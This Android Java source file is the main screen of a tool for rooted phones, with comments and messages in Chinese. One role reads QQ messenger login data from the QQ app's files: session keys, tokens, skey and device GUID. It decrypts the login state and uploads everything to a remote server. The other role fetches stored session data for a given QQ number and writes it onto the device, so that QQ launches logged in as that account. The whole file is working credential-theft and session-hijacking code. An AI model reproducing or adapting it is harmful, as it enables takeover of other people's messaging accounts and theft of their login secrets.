package com.extracache.cachetool;

import android.Manifest;
import android.content.ComponentName;
import android.content.Intent;
import android.content.SharedPreferences;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Looper;
import android.util.Log;
import android.view.View;
import android.widget.ScrollView;
import android.widget.TextView;
import android.widget.Toast;
import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import com.extracache.cachetool.base.Constants;
import com.extracache.cachetool.base.Result;
import com.extracache.cachetool.http.QQSessionHttpServer;
import com.extracache.cachetool.model.SessionData;
import com.extracache.cachetool.network.ServerApi;
import com.extracache.cachetool.utils.AssetsUtils;
import com.extracache.cachetool.utils.DeviceUtils;
import com.extracache.cachetool.utils.HexUtils;
import com.google.android.material.button.MaterialButton;
import com.google.android.material.textfield.TextInputEditText;
import com.google.android.material.textfield.TextInputLayout;
import org.json.JSONObject;
import java.text.SimpleDateFormat;
import java.util.Date;
import java.util.Locale;
import java.util.Map;

public class MainActivity extends AppCompatActivity {
    private static final String TAG = Constants.LOG_TAG;
    private static final int REQUEST_CODE_STORAGE_PERMISSION = 1;
    private static final String PREFS_NAME = "login_tool_prefs";
    private static final String PREF_TOKEN = "server_token";
    private static final String PREF_ROLE_ID = "role_id";
    private static final String PREF_ROLE_NAME = "role_name";
    private static final int ROLE_APP_EXTRACT = 400;
    private static final int ROLE_APP_UPLOAD = 500;
    
    private TextInputEditText editInput;
    private TextInputLayout layoutInput;
    private MaterialButton btnExport;
    private MaterialButton btnExtractCache;
    private MaterialButton btnLogout;
    private TextView textTitle;
    private TextView textResult;
    private ScrollView scrollResult;
    
    // HTTP服务器相关
    private QQSessionHttpServer httpServer;
    private QQSessionService sessionService;
    private SharedPreferences preferences;
    private int currentRoleId = 0;
    private String currentRoleName = "";

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        preferences = getSharedPreferences(PREFS_NAME, MODE_PRIVATE);
        
        // 检查并请求外部存储权限
        checkAndRequestStoragePermissions();
        
        // 初始化服务
        initServices();
        
        // 初始化UI组件
        initViews();
        
        // 设置按钮点击事件
        btnExport.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                handleImport();
            }
        });
        
        
        btnExtractCache.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                handleExport();
            }
        });
        btnLogout.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                handleLogout();
            }
        });

        restoreLoginSession();
        if (!hasValidLogin()) {
            navigateToLogin();
            return;
        }
        refreshRoleUI();
        
        
        // 启动HTTP服务器
        startHttpServer();
    }
    
    /**
     * 初始化服务
     */
    private void initServices() {
        Log.d(TAG, "初始化QQ会话服务");
        
        // 初始化QQ会话服务
        sessionService = QQSessionService.getInstance(this);
        
        // 初始化HTTP服务器
        httpServer = QQSessionHttpServer.getInstance(this);
        
        Log.d(TAG, "服务初始化完成");
    }
    
    private void initViews() {
        textTitle = findViewById(R.id.text_title);
        editInput = findViewById(R.id.edit_input);
        layoutInput = findViewById(R.id.layout_input);
        btnExport = findViewById(R.id.btn_export);
        btnExtractCache = findViewById(R.id.btn_extract_cache);
        btnLogout = findViewById(R.id.btn_logout);
        textResult = findViewById(R.id.text_result);
        scrollResult = findViewById(R.id.scroll_result);
    }

    private void restoreLoginSession() {
        String token = preferences.getString(PREF_TOKEN, "");
        currentRoleId = preferences.getInt(PREF_ROLE_ID, 0);
        currentRoleName = preferences.getString(PREF_ROLE_NAME, "");
        if (token != null && !token.trim().isEmpty()) {
            ServerApi.setAuthToken(token);
        }
    }

    private boolean hasValidLogin() {
        String token = ServerApi.getAuthToken();
        return token != null && !token.trim().isEmpty() && currentRoleId > 0;
    }

    private boolean canExtractByRole() {
        return currentRoleId == ROLE_APP_EXTRACT;
    }

    private boolean canUploadByRole() {
        return currentRoleId == ROLE_APP_UPLOAD;
    }

    private void refreshRoleUI() {
        boolean loggedIn = hasValidLogin();
        String roleText = loggedIn ? ("当前角色：" + currentRoleName + "(" + currentRoleId + ")") : "当前未登录";
        if (!loggedIn) {
            textTitle.setText("登录工具");
            btnLogout.setVisibility(View.GONE);
            btnExport.setEnabled(false);
            btnExtractCache.setEnabled(false);
            btnExport.setVisibility(View.GONE);
            btnExtractCache.setVisibility(View.GONE);
            layoutInput.setVisibility(View.GONE);
            showResult(roleText + "\n请先登录");
            return;
        }
        if (canExtractByRole()) {
            textTitle.setText("登录工具");
            btnLogout.setVisibility(View.VISIBLE);
            layoutInput.setVisibility(View.VISIBLE);
            btnExport.setVisibility(View.VISIBLE);
            btnExtractCache.setVisibility(View.GONE);
            btnExport.setEnabled(true);
            btnExport.setText("提取缓存并登录");
            btnExtractCache.setEnabled(false);
        } else if (canUploadByRole()) {
            textTitle.setText("上传工具");
            btnLogout.setVisibility(View.VISIBLE);
            layoutInput.setVisibility(View.GONE);
            btnExport.setVisibility(View.GONE);
            btnExport.setEnabled(false);
            btnExtractCache.setVisibility(View.VISIBLE);
            btnExtractCache.setEnabled(true);
            btnExtractCache.setText("上传缓存");
        } else {
            textTitle.setText("工具");
            btnLogout.setVisibility(View.VISIBLE);
            layoutInput.setVisibility(View.GONE);
            btnExport.setVisibility(View.GONE);
            btnExtractCache.setVisibility(View.GONE);
        }
    }

    private void handleLogout() {
        ServerApi.setAuthToken("");
        currentRoleId = 0;
        currentRoleName = "";
        preferences.edit()
                .remove(PREF_TOKEN)
                .remove(PREF_ROLE_ID)
                .remove(PREF_ROLE_NAME)
                .apply();
        Toast.makeText(this, "已退出登录", Toast.LENGTH_SHORT).show();
        navigateToLogin();
    }

    private void navigateToLogin() {
        Intent intent = new Intent(this, LoginActivity.class);
        intent.setFlags(Intent.FLAG_ACTIVITY_CLEAR_TOP | Intent.FLAG_ACTIVITY_NEW_TASK | Intent.FLAG_ACTIVITY_CLEAR_TASK);
        startActivity(intent);
        finish();
    }

    private void handleImport() {
        if (!hasValidLogin()) {
            navigateToLogin();
            return;
        }
        if (!canExtractByRole()) {
            showResult("当前账号无提取权限，仅App提取角色可执行该操作。");
            Toast.makeText(this, "无提取权限", Toast.LENGTH_LONG).show();
            return;
        }
        String inputText = editInput.getText().toString().trim();
        
        if (inputText.isEmpty()) {
            editInput.setError("请输入账号");
            return;
        }
        if (!inputText.matches("\\d+")) {
            editInput.setError("账号只能输入数字");
            return;
        }
        
        // 禁用按钮，显示处理中状态
        btnExport.setEnabled(false);
        btnExport.setText("处理中...");
        
        // 显示处理状态
        showResult("正在检查Root权限...");
        
        // 直接检查root权限
        new Thread(() -> checkAndRequestRoot(() -> performImport(inputText), "提取缓存并登录")).start();
    }
    
    /**
     * 检查并请求root权限，成功后执行指定的操作
     * @param onRootSuccess 获取root权限成功后的回调函数
     * @param buttonText 按钮文本（用于显示处理状态）
     */
    private void checkAndRequestRoot(Runnable onRootSuccess, String buttonText) {
        // 检查设备是否已root
        boolean isRooted = RootUtil.isRooted();
        
        runOnUiThread(() -> {
            if (!isRooted) {
                // 设备未root
                btnExport.setEnabled(true);
                btnExport.setText(buttonText);
                showResult("错误：设备未获得root权限\n\n" +
                    "此应用需要root权限才能正常工作。\n" +
                    "请先root您的设备后再尝试使用。");
                Toast.makeText(MainActivity.this, "设备需要root权限", Toast.LENGTH_LONG).show();
                return;
            }

            // 设备已root，尝试获取权限
            btnExport.setText("请求权限中...");
        });
        
        if (isRooted) {
            // 尝试获取root权限
            boolean rootGranted = RootUtil.requestRootAccess();
            
            runOnUiThread(new Runnable() {
                @Override
                public void run() {
                    if (rootGranted) {
                        // 成功获取root权限，执行回调函数
                        btnExport.setText("处理中...");
                        showResult("✓ Root权限获取成功\n正在执行操作...");
                        
                        // 延迟2秒后执行回调操作
                        new Handler(Looper.getMainLooper()).postDelayed(new Runnable() {
                            @Override
                            public void run() {
                                if (onRootSuccess != null) {
                                    onRootSuccess.run();
                                }
                            }
                        }, 2000);
                    } else {
                        // 未能获取root权限
                        btnExport.setEnabled(true);
                        btnExport.setText(buttonText);
                        showResult("错误：Root权限请求被拒绝\n\n" +
                            "用户拒绝了root权限请求。\n" +
                            "请允许此应用获得root权限后再试。");
                        Toast.makeText(MainActivity.this, "Root权限请求被拒绝", Toast.LENGTH_LONG).show();
                    }
                }
            });
        }
    }
    
    private void performImport(String inputText) {
        // 在后台线程中执行QQ会话操作
        new Thread(new Runnable() {
            @Override
            public void run() {
                performImportQQSession(inputText);
            }
        }).start();
    }
    
    /**
     * 执行QQ会话操作（从服务器请求数据并导入到设备）
     */
    private void performImportQQSession(String inputQQ) {
        Log.d(TAG, "开始QQ会话操作，目标QQ: " + inputQQ);
        
        try {
            // 获取设备ID
            String deviceId = DeviceUtils.getSerialNumber();
            Log.d(TAG, "设备ID: " + deviceId);
            
            // 从服务器请求AccountRecord数据
            final SessionData serverSessionData;
            try {
                Log.d(TAG, "正在从服务器请求QQ数据...");
                serverSessionData = ServerApi.requestAccountRecord(inputQQ, deviceId);
                Log.d(TAG, "成功从服务器获取数据: " + serverSessionData.toString());
            } catch (Exception e) {
                Log.e(TAG, "从服务器请求数据失败", e);
                runOnUiThread(() -> {
                    showResult("错误：从服务器获取数据失败\n" + e.getMessage() + "\n\n可能原因：\n• 网络连接问题\n• QQ号不存在于服务器\n• 服务器响应错误");
                    btnExport.setEnabled(true);
                    btnExport.setText("提取缓存并登录");
                    Toast.makeText(MainActivity.this, "服务器请求失败: " + e.getMessage(), Toast.LENGTH_LONG).show();
                });
                return;
            }
            
            // 验证服务器返回的数据
            if (serverSessionData == null || !serverSessionData.isValid()) {
                Log.e(TAG, "服务器返回的数据无效");
                runOnUiThread(() -> {
                    showResult("错误：服务器返回的数据无效\n\n可能原因：\n• QQ号不存在\n• 数据已过期\n• 数据格式错误");
                    btnExport.setEnabled(true);
                    btnExport.setText("提取缓存并登录");
                    Toast.makeText(MainActivity.this, "服务器数据无效", Toast.LENGTH_LONG).show();
                });
                return;
            }
            
            // 设置目标QQ号
            serverSessionData.setQq(inputQQ);
            
            // 从服务器数据生成QQ登录环境
            Result<Boolean> generateResult = sessionService.generateFreshQQEnvironment(serverSessionData);

            runOnUiThread(() -> {
                if (generateResult.isSuccess()) {
                    // 成功 - 显示服务器数据导入成功
                    String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());

                    StringBuilder result = new StringBuilder();
                    result.append("=== QQ环境生成成功 ===\n");
                    result.append("时间: ").append(timestamp).append("\n");
                    result.append("账号: ").append(inputQQ).append("\n");
                    result.append("设备ID: ").append(deviceId).append(" ✓\n");
                    result.append("Root权限: 已获取 ✓\n");
                    result.append("服务器连接: 成功 ✓\n");
                    result.append("数据解析: 成功 ✓\n");
                    result.append("环境生成: 成功 ✓\n");
                    result.append("\n=== 操作详情 ===\n");
                    result.append("• 从服务器获取QQ登录数据\n");
                    result.append("• 解析INI格式的会话信息\n");
                    result.append("• 验证数据完整性和有效性\n");
                    result.append("• 生成QQ登录文件结构\n");
                    result.append("• 导入账号数据\n");
                    result.append("\n=== 数据信息 ===\n");
                    result.append("• QQ号: ").append(serverSessionData.getQq()).append("\n");
                    result.append("• UID: ").append(serverSessionData.getUid() != null ? serverSessionData.getUid() : "未知").append("\n");
                    result.append("• GUID: ").append(serverSessionData.getGuid() != null ? serverSessionData.getGuid() : "未知").append("\n");
                    result.append("• Token数量: ").append(serverSessionData.getTokens().size()).append("\n");
                    result.append("• 数据有效性: ").append(serverSessionData.isValid() ? "有效" : "无效").append("\n");
                    result.append("\n导入完成！正在启动QQ...");

                    showResult(result.toString());

                    // 恢复按钮状态
                    btnExport.setEnabled(true);
                    btnExport.setText("提取缓存并登录");

                    // 显示成功提示
                    Toast.makeText(MainActivity.this, "QQ导入成功", Toast.LENGTH_SHORT).show();

                    // 延迟1秒后启动QQ
                    new Handler(Looper.getMainLooper()).postDelayed(() -> startQQApp(), 1000);

                } else {
                    // 失败 - 显示生成失败信息
                    showResult("错误：QQ导入生成失败\n" + generateResult.getMessage() + "\n\n可能原因：\n• 设备权限不足\n• 存储空间不足\n• 文件生成失败\n• 系统保护机制");

                    btnExport.setEnabled(true);
                    btnExport.setText("提取缓存并登录");

                    Toast.makeText(MainActivity.this, "QQ环境生成失败", Toast.LENGTH_SHORT).show();
                }
            });
            
        } catch (Exception e) {
            Log.e(TAG, "QQ会话操作异常", e);
            
            runOnUiThread(() -> {
                showResult("错误：操作异常\n" + e.getMessage() + "\n\n可能原因：\n• 网络连接异常\n• 服务器响应超时\n• 数据解析错误\n• 系统权限问题\n• 设备存储异常");
                btnExport.setEnabled(true);
                btnExport.setText("提取缓存并登录");
                Toast.makeText(MainActivity.this, "操作异常: " + e.getMessage(), Toast.LENGTH_LONG).show();
            });
        }
    }
    
    /**
     * 启动QQ应用（参考原始MainActivity实现）
     */
    private void startQQApp() {
        try {
            Log.d(TAG, "启动QQ应用");
            
            // 参考原始代码的QQ启动方式
            Intent intent = new Intent();
            intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
            ComponentName componentName = new ComponentName(
                    Constants.QQ_PACKAGE_NAME,
                    "com.tencent.mobileqq.activity.SplashActivity"
            );
            intent.setComponent(componentName);
            startActivity(intent);
            
            Toast.makeText(this, "正在启动QQ...", Toast.LENGTH_SHORT).show();
            
        } catch (Exception e) {
            Log.e(TAG, "启动QQ失败", e);
            // 如果启动失败，尝试通用方式
            openQQ();
        }
    }
    
    /**
     * 启动HTTP服务器
     */
    private void startHttpServer() {
        Log.d(TAG, "启动HTTP服务器");
        
        new Thread(() -> {
            Result<Boolean> result = httpServer.start();
            
            runOnUiThread(() -> {
                if (result.isSuccess()) {
                    Log.i(TAG, "HTTP服务器启动成功，端口: " + Constants.DEFAULT_SERVER_PORT);
                    // 可选：显示启动成功的Toast
                    // Toast.makeText(this, "HTTP服务器已启动，端口: " + Constants.DEFAULT_SERVER_PORT, Toast.LENGTH_SHORT).show();
                } else {
                    Log.e(TAG, "HTTP服务器启动失败: " + result.getMessage());
                    Toast.makeText(this, "HTTP服务器启动失败: " + result.getMessage(), Toast.LENGTH_LONG).show();
                }
            });
        }).start();
    }
    
    
    /**
     * 显示结果文本并显示结果区域
     */
    private void showResult(String text) {
        textResult.setText(text);
        scrollResult.setVisibility(View.VISIBLE);
    }
    
    private void openQQ() {
        try {
            // 尝试打开QQ应用
            PackageManager packageManager = getPackageManager();
            Intent intent = packageManager.getLaunchIntentForPackage("com.tencent.mobileqq");
            
            if (intent != null) {
                // QQ已安装，启动应用
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                startActivity(intent);
                Toast.makeText(this, "正在打开QQ...", Toast.LENGTH_SHORT).show();
            } else {
                // QQ未安装，显示提示
                Toast.makeText(this, "未检测到QQ应用，请先安装QQ", Toast.LENGTH_LONG).show();
                
                // 可选：打开应用商店下载QQ
                try {
                    Intent marketIntent = new Intent(Intent.ACTION_VIEW);
                    marketIntent.setData(android.net.Uri.parse("market://details?id=com.tencent.mobileqq"));
                    startActivity(marketIntent);
                } catch (Exception e) {
                    // 如果没有应用商店，可以打开网页版
                    Toast.makeText(this, "无法打开应用商店", Toast.LENGTH_SHORT).show();
                }
            }
        } catch (Exception e) {
            Toast.makeText(this, "打开QQ时出现错误: " + e.getMessage(), Toast.LENGTH_LONG).show();
        }
    }
    
    /**
     * 处理提取缓存操作
     */
    private void handleExport() {
        if (!hasValidLogin()) {
            navigateToLogin();
            return;
        }
        if (!canUploadByRole()) {
            showResult("当前账号无上传权限，仅App上传角色可执行该操作。");
            Toast.makeText(this, "无上传权限", Toast.LENGTH_LONG).show();
            return;
        }
        Log.d(TAG, "开始上传缓存操作");
        
        // 显示处理中状态
        btnExtractCache.setEnabled(false);
        btnExtractCache.setText("上传中...");
        showResult("正在检查Root权限...");
        
        // 在后台线程中执行提取操作
        new Thread(new Runnable() {
            @Override
            public void run() {
                checkAndRequestRoot(() -> performExportQQSession(), "上传缓存");
            }
        }).start();
    }
    
    /**
     * 执行提取缓存操作
     */
    private void performExportQQSession() {
        try {
            Log.d(TAG, "开始读取QQ会话数据");
            
            runOnUiThread(() -> {
                showResult("正在提取QQ登录缓存数据...\n✓ 检查Root权限中...");
            });
            
            // 检查root权限
            boolean isRooted = RootUtil.isRooted();
            if (!isRooted) {
                runOnUiThread(() -> {
                    showResult("错误：设备未获得root权限\n\n此功能需要root权限才能访问QQ数据文件。\n请先root您的设备后再尝试使用。");
                    btnExtractCache.setEnabled(true);
                    btnExtractCache.setText("上传缓存");
                    Toast.makeText(MainActivity.this, "设备需要root权限", Toast.LENGTH_LONG).show();
                });
                return;
            }
            
            // 尝试获取root权限
            boolean rootGranted = RootUtil.requestRootAccess();
            if (!rootGranted) {
                runOnUiThread(() -> {
                    showResult("错误：Root权限请求被拒绝\n\n用户拒绝了root权限请求。\n请允许此应用获得root权限后再试。");
                    btnExtractCache.setEnabled(true);
                    btnExtractCache.setText("上传缓存");
                    Toast.makeText(MainActivity.this, "Root权限请求被拒绝", Toast.LENGTH_LONG).show();
                });
                return;
            }
            
            runOnUiThread(() -> {
                showResult("正在提取QQ登录缓存数据...\n✓ Root权限验证成功\n正在读取QQ数据文件...");
            });
            
            // 读取QQ会话数据
            Result<SessionData> result = sessionService.readQQSession();
            
            runOnUiThread(() -> {
                if (result.isSuccess()) {
                    SessionData sessionData = result.getData();
                    
                    
                    // 生成提取结果
                    String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
                    
                    StringBuilder extractResult = new StringBuilder();
                    extractResult.append("=== QQ缓存提取成功 ===\n");
                    extractResult.append("提取时间: ").append(timestamp).append("\n");
                    extractResult.append("QQ号码: ").append(sessionData.getQq() != null ? sessionData.getQq() : "未知").append("\n");
                    extractResult.append("设备GUID: ").append(sessionData.getGuid() != null ? sessionData.getGuid() : "未知").append("\n");
                    extractResult.append("UID: ").append(sessionData.getUid() != null ? sessionData.getUid() : "未知").append("\n");
                    extractResult.append("\n=== 提取详情 ===\n");
                    extractResult.append("• Root权限验证成功\n");
                    extractResult.append("• QQ数据文件读取成功\n");
                    extractResult.append("• 登录态解密成功\n");
                    extractResult.append("• 会话数据提取完成\n");
                    
                    // 添加关键Token信息（部分显示）
                    if (sessionData.getSessionKey() != null && !sessionData.getSessionKey().isEmpty()) {
                        String maskedSessionKey = sessionData.getSessionKey().length() > 8 ? 
                            sessionData.getSessionKey().substring(0, 8) + "..." : sessionData.getSessionKey();
                        extractResult.append("• SessionKey: ").append(maskedSessionKey).append("\n");
                    }
                    
                    if (sessionData.getToken0143() != null && !sessionData.getToken0143().isEmpty()) {
                        String maskedToken = sessionData.getToken0143().length() > 8 ? 
                            sessionData.getToken0143().substring(0, 8) + "..." : sessionData.getToken0143();
                        extractResult.append("• Token0143: ").append(maskedToken).append("\n");
                    }
                    
                    extractResult.append("\n=== 数据状态 ===\n");
                    extractResult.append("数据完整性: ").append(sessionData.isValid() ? "完整" : "不完整").append("\n");
                    extractResult.append("可用于登录: ").append(sessionData.isValid() ? "是" : "否").append("\n");
                    extractResult.append("\n正在上传到服务器...\n");
                    
                    showResult(extractResult.toString());
                    
                    // 自动上传到服务器
                    performUploadServer(sessionData);
                    
                } else {
                    // 提取失败
                    showResult("错误：QQ缓存提取失败\n" + result.getMessage() + 
                             "\n\n可能原因：\n• QQ未登录过\n• 数据文件不存在\n• 权限不足\n• 数据已损坏");
                    
                    btnExtractCache.setEnabled(true);
                    btnExtractCache.setText("上传缓存");
                    
                    Toast.makeText(MainActivity.this, "缓存提取失败: " + result.getMessage(), Toast.LENGTH_LONG).show();
                }
            });
            
        } catch (Exception e) {
            Log.e(TAG, "提取缓存操作异常", e);
            
            runOnUiThread(() -> {
                showResult("错误：提取操作异常\n" + e.getMessage());
                btnExtractCache.setEnabled(true);
                btnExtractCache.setText("上传缓存");
                Toast.makeText(MainActivity.this, "提取异常: " + e.getMessage(), Toast.LENGTH_LONG).show();
            });
        }
    }
    
    /**
     * 执行上传服务器操作
     */
    private void performUploadServer(SessionData sessionData) {
        Log.d(TAG, "开始上传QQ会话数据到服务器");
        
        runOnUiThread(() -> {
            showResult("正在上传数据到服务器...\n✓ 准备上传数据\n正在连接服务器...");
        });
        
        // 获取设备ID
        String deviceId = DeviceUtils.getSerialNumber();
        Log.d(TAG, "设备ID: " + deviceId);
        
        // 生成INI格式的数据（参考extracache格式）
        String iniContent = generateIniContent(sessionData);
        Log.d(TAG, "INI内容长度: " + iniContent.length());
        
        runOnUiThread(() -> {
            showResult("正在上传数据到服务器...\n✓ 准备上传数据\n✓ 连接服务器成功\n正在上传数据...");
        });
        
        // 在后台线程中上传数据到服务器
        new Thread(() -> {
            try {
                String response = ServerApi.uploadRawData(
                    sessionData.getQq() != null ? sessionData.getQq() : "",
                    "", // 密码留空
                    iniContent,
                    deviceId
                );
                
                runOnUiThread(() -> {
                    // 生成上传结果
                    String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());
                    
                    StringBuilder uploadResult = new StringBuilder();
                    uploadResult.append("=== 服务器上传成功 ===\n");
                    uploadResult.append("上传时间: ").append(timestamp).append("\n");
                    uploadResult.append("QQ号码: ").append(sessionData.getQq() != null ? sessionData.getQq() : "未知").append("\n");
                    uploadResult.append("设备ID: ").append(deviceId).append("\n");
                    uploadResult.append("服务器响应: ").append(response).append("\n");
                    uploadResult.append("\n=== 上传详情 ===\n");
                    uploadResult.append("• 数据格式: INI格式\n");
                    uploadResult.append("• 数据大小: ").append(iniContent.length()).append(" 字符\n");
                    uploadResult.append("• 上传状态: 成功\n");
                    uploadResult.append("• 服务器: ").append(ServerApi.API_HOST).append("\n");
                    
                    // 添加JSON数据（用于导出）
                    try {
                        JSONObject jsonData = sessionData.toJson();
                        uploadResult.append("\n=== JSON数据 ===\n");
                        uploadResult.append("(可复制以下JSON用于导入其他设备)\n");
                        uploadResult.append(jsonData.toString(2));
                    } catch (Exception e) {
                        Log.w(TAG, "生成JSON数据失败", e);
                        uploadResult.append("\n注意: JSON数据生成失败\n");
                    }
                    
                    showResult(uploadResult.toString());
                    
                    btnExtractCache.setEnabled(true);
                    btnExtractCache.setText("上传缓存");
                    
                    Toast.makeText(MainActivity.this, "提取并上传成功！", Toast.LENGTH_SHORT).show();
                });
                
            } catch (Exception e) {
                Log.e(TAG, "上传服务器操作异常", e);
                
                runOnUiThread(() -> {
                    showResult("错误：上传失败\n" + e.getMessage() + "\n\n可能原因：\n• 网络连接问题\n• 服务器不可用\n• 数据格式错误");
                    
                    btnExtractCache.setEnabled(true);
                    btnExtractCache.setText("上传缓存");
                    
                    Toast.makeText(MainActivity.this, "上传失败: " + e.getMessage(), Toast.LENGTH_LONG).show();
                });
            }
        }).start();
    }
    
    /**
     * 生成INI格式的内容（参考extracache格式）
     */
    private String generateIniContent(SessionData sessionData) {
        StringBuilder iniContent = new StringBuilder();
        
        String qqNumber = sessionData.getQq() != null ? sessionData.getQq() : "unknown";
        iniContent.append("[").append(qqNumber).append("]\r\n");
        
        // 添加基本信息
        iniContent.append("qqnum=").append(qqNumber).append("\r\n");
        iniContent.append("guid=").append(sessionData.getGuid() != null ? sessionData.getGuid() : "").append("\r\n");
        iniContent.append("uid=").append(sessionData.getUid() != null ? sessionData.getUid() : "").append("\r\n");
        
        // 添加所有Token信息
        for (Map.Entry<String, String> entry : sessionData.getTokens().entrySet()) {
            String key = entry.getKey();
            String value = entry.getValue();
            if (value != null && !value.trim().isEmpty()) {
                iniContent.append(key).append("=").append(value).append("\r\n");
            }
        }
        
        // 处理 _sKey，生成 skey 字段
        String sKey = sessionData.getSKey();
        if (sKey != null && !sKey.trim().isEmpty()) {
            // 将 _sKey 的十六进制字符串转换为普通字符串
            String skeyString = HexUtils.hexStringToString(sKey);
            if (!skeyString.isEmpty()) {
                iniContent.append("skey=").append(skeyString).append("\r\n");
            }
        }
        
        // 添加时间戳
        iniContent.append("extractTime=").append(System.currentTimeMillis()).append("\r\n");
        iniContent.append("deviceInfo=").append(DeviceUtils.getDeviceInfo()).append("\r\n");
        
        return iniContent.toString();
    }
    
    /**
     * 检查并请求外部存储权限
     */
    private void checkAndRequestStoragePermissions() {
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED ||
            ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) {

            // 请求权限
            ActivityCompat.requestPermissions(this,
                    new String[]{Manifest.permission.READ_EXTERNAL_STORAGE, Manifest.permission.WRITE_EXTERNAL_STORAGE},
                    REQUEST_CODE_STORAGE_PERMISSION);
        } else {
            // 已经拥有权限
            Log.i(TAG, "外部存储权限已被授予");
        }
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        if (requestCode == REQUEST_CODE_STORAGE_PERMISSION) {
            if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
                Log.i(TAG, "外部存储权限已被授予");
                Toast.makeText(this, "外部存储权限已授予", Toast.LENGTH_SHORT).show();
            } else {
                Log.e(TAG, "外部存储权限被拒绝");
                Toast.makeText(this, "需要外部存储权限才能复制文件", Toast.LENGTH_LONG).show();
            }
        }
    }
    
    @Override
    protected void onDestroy() {
        super.onDestroy();
        
        // 停止HTTP服务器
        if (httpServer != null) {
            httpServer.stop();
            Log.d(TAG, "MainActivity销毁，HTTP服务器已停止");
        }
    }
    
    /**
     * 使用默认配置初始化QQ环境
     */
    private void performDefaultInitialization() {
        new Thread(() -> {
            try {
                Log.d(TAG, "开始使用默认配置初始化QQ环境");

                // 先初始化服务
                Result<Boolean> initResult = sessionService.initialize();
                if (initResult.isFailure()) {
                    Log.e(TAG, "服务初始化失败: " + initResult.getMessage());
                    runOnUiThread(() -> {
                        showResult("❌ 服务初始化失败\n" + initResult.getMessage());
                        btnExport.setEnabled(true);
                        btnExport.setText("提取缓存并登录");
                        Toast.makeText(MainActivity.this, "服务初始化失败", Toast.LENGTH_LONG).show();
                    });
                    return;
                }

                Log.d(TAG, "服务初始化成功");

                // 从assets加载默认配置JSON
                Result<String> configResult = AssetsUtils.readTextFile(MainActivity.this, "config/default_session.json");
                if (configResult.isFailure()) {
                    runOnUiThread(() -> {
                        showResult("❌ 默认配置加载失败\n" + configResult.getMessage());
                        btnExport.setEnabled(true);
                        btnExport.setText("提取缓存并登录");
                        Toast.makeText(MainActivity.this, "默认配置加载失败", Toast.LENGTH_LONG).show();
                    });
                    return;
                }

                String defaultJson = configResult.getData();
                Log.d(TAG, "默认配置JSON加载成功，长度: " + defaultJson.length());

                runOnUiThread(() -> {
                    showResult("✓ 默认配置加载成功\n正在创建全新QQ环境...");
                });

                // 使用createFreshQQFromJson创建全新QQ环境
                Result<Boolean> createResult = sessionService.createFreshQQFromJson(defaultJson, null);

                runOnUiThread(() -> {
                    if (createResult.isSuccess()) {
                        // 初始化成功
                        String timestamp = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(new Date());

                        StringBuilder result = new StringBuilder();
                        result.append("=== 默认环境初始化成功 ===\n");
                        result.append("初始化时间: ").append(timestamp).append("\n");
                        result.append("初始化方式: 全新设备环境创建\n");
                        result.append("\n=== 初始化详情 ===\n");
                        result.append("• 服务初始化成功\n");
                        result.append("• 默认配置JSON加载成功\n");
                        result.append("• 全新QQ环境创建成功\n");
                        result.append("• 登录状态已设置\n");
                        result.append("• 可以开始使用QQ\n");
                        result.append("\n初始化完成！现在可以正常使用QQ了。");

                        showResult(result.toString());

                        btnExport.setEnabled(true);
                        btnExport.setText("提取缓存并登录");

                        Toast.makeText(MainActivity.this, "默认环境初始化成功！", Toast.LENGTH_SHORT).show();

                    } else {
                        // 初始化失败
                        showResult("❌ 默认环境初始化失败\n" + createResult.getMessage() + "\n\n可能原因：\n• 权限不足\n• QQ应用未安装\n• 文件写入失败");

                        btnExport.setEnabled(true);
                        btnExport.setText("提取缓存并登录");

                        Toast.makeText(MainActivity.this, "初始化失败: " + createResult.getMessage(), Toast.LENGTH_LONG).show();
                    }
                });

            } catch (Exception e) {
                Log.e(TAG, "默认配置初始化异常", e);

                runOnUiThread(() -> {
                    showResult("❌ 默认配置初始化异常\n" + e.getMessage());

                    btnExport.setEnabled(true);
                    btnExport.setText("提取缓存并登录");

                    Toast.makeText(MainActivity.this, "初始化异常: " + e.getMessage(), Toast.LENGTH_LONG).show();
                });
            }
        }).start();
    }
}
